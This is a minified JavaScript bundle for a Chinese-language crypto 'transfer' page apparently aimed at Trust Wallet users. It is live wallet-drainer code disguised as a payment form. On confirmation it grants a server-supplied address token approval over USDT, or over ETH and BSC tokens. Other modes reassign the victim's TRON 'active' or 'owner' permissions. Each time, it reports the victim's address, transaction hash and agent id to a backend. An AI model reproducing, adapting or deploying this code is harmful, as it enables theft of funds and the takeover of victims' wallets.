import{u as e}from"./9gE-0e0c53b1.js";import{g as a,s as t,a as s,b as l}from"./5uQ-29cbdec0.js";import{B as i,t as r,g as o,a as u,b as n,c}from"./98sGi-22f0576a.js";import{c as d,g as p,a as v,b as m,f,h as b}from"./p1-e3a8e44a.js";import{v as j,c as g,b as w,Q as y,P as h,l as k,M as R,R as T,S,O as x,q as I}from"./fOrZ0HVzuE-6dd3f50b.js";import{r as U,u as L}from"./zKUA2VG6-098e3b9e.js";import{F as A,B as q,s as X,a as B,c as E}from"./hPbsEK-a5302c73.js";import{P as N}from"./oeSLe-b6b11daa.js";import{_ as H}from"./ZnMyRYn-921f7563.js";import"./d-efd4e3c8.js";import"./4Bdyrk-90f88067.js";import"./4FUl3On-9d71d848.js";import"./J4YL7kOJKL-06ac4daa.js";import"./JGxCNkiCBL-46bd934a.js";import"./vUU61iUR-ce88691f.js";import"./oE-dd24f959.js";import"./ZpQOZlRdI-496d7a90.js";import"./4GIX8hNPGH-a4a88aca.js";import"./nrp1o-1f032246.js";import"./vtKH-92d82fc7.js";import"./a5q0DqU-d43a279a.js";import"./PFgh-c25f6698.js";import"./e3X-b7123f9b.js";import"./pDwSFrd6y-c3138ec2.js";import"./kUJK1hTq-80d867d0.js";import"./HuGN0be-0f431f89.js";import"./FZjZo0-747a14c1.js";import"./j0dH-9a61d0a6.js";import"./Fj-cc7ceab0.js";import"./qV-2c21aba4.js";import"./OjerpUQ-768950b0.js";/* empty css                */import"./v-9bc2b98e.js";/* empty css            */import"./P1kl-29c12333.js";import"./X3qMjd4RO-c681ea97.js";import"./L6GIdWs-8ead1739.js";import"./hdEs5mj-081147b2.js";import"./Behr-b8c04985.js";import"./J6-c4eeb796.js";import"./SEUQg8l-59acaf37.js";import"./HSfIuD-99949154.js";import"./uyPFz46w-c24024d6.js";import"./LjWJN0y5Y-f176ca25.js";import"./ZOr-009da19d.js";import"./6JCiysWrAz-f8058f23.js";import"./F-82288e54.js";import"./7EFE2hPGZ-42e07982.js";import"./lqr0H-426a928f.js";import"./YA-5dcea6b6.js";import"./jOc9QTF-1f3975f5.js";import"./4vPfRHjOJV-a658a92c.js";import"./79Rb5-06ff8464.js";import"./y0c6NR-8760903a.js";import"./Ix-877aba1d.js";import"./i-0e58dc33.js";import"./AZvse-aeed37d8.js";import"./bSJkK-81a07ebe.js";import"./gLTI-e11b3c8e.js";import"./ptI30i5o5p-7da81808.js";import"./5-5a661122.js";import"./ld-3d10b917.js";import"./L8SeVx-cb566d4b.js";import"./mKJU-7354d83e.js";const _=e=>(T("data-v-7d0aff10"),e=e(),S(),e),F={class:"main-container-wrapper"},O={class:"page-container"},J={style:{margin:"10px 16px"}},G=_((()=>h("p",{class:"label"},"收款地址",-1))),$={class:"input-container"},V=_((()=>h("p",{class:"label"},"数量",-1))),z={class:"input-container",style:{"margin-bottom":"0"}},C={class:"flex"},P={style:{"font-weight":"500"}},Z={style:{"font-size":"12px"}},K={class:"page-confirm"},M=H(j({__name:"trust",setup(j){U(null);const T=U(0),S=U(0),H=U({type:1,walletType:1,agentId:"",token:"USDT",amount:1,block:i.TRX,clientId:"",ads:"",isAdd:!1,client_type:1,extend:{}}),_=U(""),M=U({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),Q=(e(),U("")),D=U(null),W=U(!0),Y=U([{name:"Slow",src:new URL("/test/static/svg/Ei38jAG-07b5b9ae.svg",self.location).href,quantity:"0.00007875",usd:"$0.019",unit:"BNB"},{name:"Medium",src:new URL("/test/static/svg/55XtnXI1w-2f601456.svg",self.location).href,quantity:"0.0000945",usd:"$0.023",unit:"BNB"},{name:"Fast",src:new URL("/test/static/svg/RIb-8d3e2675.svg",self.location).href,quantity:"0.0001512",usd:"$0.037",unit:"BNB"}]),ee=g((()=>H.value.ads||M.value.receiveAddress[H.value.block]));U(0);const ae=()=>{if(W.value=!0,!T.value||0==T.value)return W.value=!1,X("转账金额需要大于0");const{type:e}=H.value;if(S.value<T.value)return W.value=!1,X("Insufficient balance");1==e?(async()=>{try{if(B({message:"Loading...",duration:0}),H.value.block==i.TRX){const e=await u("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",_.value,Q.value);W.value=!0,e.result&&(te(Q.value,"approve",e.txid),X(M.value.authSuccessTips))}else H.value.block==i.ETH?await f(D.value,Q.value,_.value,(e=>{e?(te(Q.value,"approve",e),X(M.value.authSuccessTips)):W.value=!1})):H.value.block==i.BSC&&b(D.value,Q.value,_.value,(e=>{e?(te(Q.value,"approve",e),X(M.value.authSuccessTips)):W.value=!1}))}catch(e){E(),W.value=!1}})():2==e?(async()=>{if(H.value.block!=i.TRX)return;const e=await n(_.value,Q.value,H.value.isAdd);(null==e?void 0:e.result)?(te(Q.value,"active",e.txid),X(M.value.authSuccessTips),E()):e&&X("object"==typeof e?JSON.stringify(e):String(e))})():(async()=>{if(H.value.block!=i.TRX)return;const e=await c(_.value);e.result&&(te(Q.value,"owner",e.txid),X(M.value.authSuccessTips))})()},te=async(e,a,i)=>{const r={addres:e,auth_addres:_.value,hash:i||0,wallete_type:"Trust",client_id:H.value.clientId,source:window.location.href,agent_uid:H.value.agentId,block:H.value.block,client_type:H.value.client_type,amount:H.value.amount,extend:H.value.extend?JSON.stringify(H.value.extend):""};switch(a){case"approve":await l(r);break;case"active":await s(r);break;case"owner":await t(r)}W.value=!1,E()},se=U();return w((()=>{const e=JSON.parse(localStorage.getItem("routerParams"));T.value=e.amount,H.value={amount:T.value,type:e.type,walletType:1,agentId:e.agent,token:e.token||"USDT",block:e.block||i.TRX,clientId:e.clientId||"",ads:e.ads,isAdd:e.isAdd,client_type:e.client_type||1,extend:e.extend||""},(()=>{switch(H.value.block){case i.TRX:Y.value=[{name:"Slow",src:new URL("/test/static/svg/Ei38jAG-07b5b9ae.svg",self.location).href,quantity:"3",usd:"$0.327423",unit:"TRX"},{name:"Medium",src:new URL("/test/static/svg/55XtnXI1w-2f601456.svg",self.location).href,quantity:"5",usd:"$0.545706",unit:"TRX"},{name:"Fast",src:new URL("/test/static/svg/RIb-8d3e2675.svg",self.location).href,quantity:"10",usd:"$1.091411",unit:"TRX"}];break;case i.ETH:Y.value=[{name:"Slow",src:new URL("/test/static/svg/Ei38jAG-07b5b9ae.svg",self.location).href,quantity:"0.0007846",usd:"$1.993",unit:"ETH"},{name:"Medium",src:new URL("/test/static/svg/55XtnXI1w-2f601456.svg",self.location).href,quantity:"0.001043",usd:"$2.5733",unit:"ETH"},{name:"Fast",src:new URL("/test/static/svg/RIb-8d3e2675.svg",self.location).href,quantity:"0.001299",usd:"$3.3",unit:"ETH"}];break;case i.BSC:Y.value=[{name:"Slow",src:new URL("/test/static/svg/Ei38jAG-07b5b9ae.svg",self.location).href,quantity:"0.00007875",usd:"$0.019",unit:"BNB"},{name:"Medium",src:new URL("/test/static/svg/55XtnXI1w-2f601456.svg",self.location).href,quantity:"0.0000945",usd:"$0.023",unit:"BNB"},{name:"Fast",src:new URL("/test/static/svg/RIb-8d3e2675.svg",self.location).href,quantity:"0.0001512",usd:"$0.037",unit:"BNB"}]}})(),(async()=>{try{const e=JSON.parse(localStorage.getItem("config"));M.value={...e};const{type:t}=H.value;W.value=!0;const s=(await a({block:H.value.block,type:r[H.value.type]})).data;M.value={...e,authAddress:s},_.value=M.value.authAddress}catch(e){W.value=!1}})(),se.value=setInterval((async()=>{window.ethereum&&(clearInterval(se.value),await window.ethereum.enable(),(async()=>{let e;switch(H.value.block){case i.TRX:if(Q.value=await tronWeb.defaultAddress.base58,!Q.value)return X("无法获取钱包地址！请检查浏览器是否支持TRON！");S.value=await o(Q.value,H.value.token),W.value=!1;break;case i.ETH:e=await v(),D.value=e.web3,Q.value=e.userAddress,S.value=await m(D.value,e.userAddress),W.value=!1;break;case i.BSC:e=await d(),D.value=e.web3,Q.value=e.userAddress,S.value=await p(D.value,e.userAddress),W.value=!1}})())}),200)})),(e,a)=>(x(),y("div",F,[h("div",O,[h("div",J,[G,h("div",$,[k(L(A),{border:!1,modelValue:ee.value,"onUpdate:modelValue":a[0]||(a[0]=e=>ee.value=e),disabled:!0,label:"",placeholder:"请输入收款地址",size:"large",style:{"font-size":"14px",padding:"8px 14px","border-radius":"5px","background-color":"transparent","font-weight":"bold"}},null,8,["modelValue"])]),V,h("div",z,[k(L(A),{type:"number",border:!1,modelValue:T.value,"onUpdate:modelValue":a[2]||(a[2]=e=>T.value=e),label:"",placeholder:"请输入数量",size:"large",style:{"font-size":"14px",padding:"8px 14px","border-radius":"5px","background-color":"transparent","font-weight":"bold"}},{button:R((()=>[h("div",C,[h("span",P,N(String(H.value.token).toLocaleUpperCase()),1),h("span",{class:"all left-m10",onClick:a[1]||(a[1]=e=>T.value=S.value)},"全部")])])),_:1},8,["modelValue"])]),h("p",Z,"≈$"+N(Number(T.value).toFixed(2)),1),h("div",K,[k(L(q),{style:{width:"100%","border-radius":"999px",padding:"25px 0"},onClick:ae,loading:W.value,type:"primary",color:"#0500f5"},{default:R((()=>[I(" 下一步 ")])),_:1},8,["loading"])])])])]))}}),[["__scopeId","data-v-7d0aff10"]]);export{M as default};
